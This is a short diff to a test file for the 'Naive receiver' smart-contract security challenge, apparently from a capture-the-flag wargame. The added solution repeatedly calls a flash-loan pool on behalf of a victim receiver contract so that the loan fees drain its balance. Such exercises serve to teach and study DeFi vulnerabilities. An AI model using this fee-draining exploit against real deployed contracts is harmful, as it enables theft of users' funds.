@@ -38,6 +38,11 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        for(let x=0; x<10; x++){
+            await pool.connect(player).flashLoan(receiver.address,
+                ETH,0,"0x");
+        }
     });
 
     after(async function () {
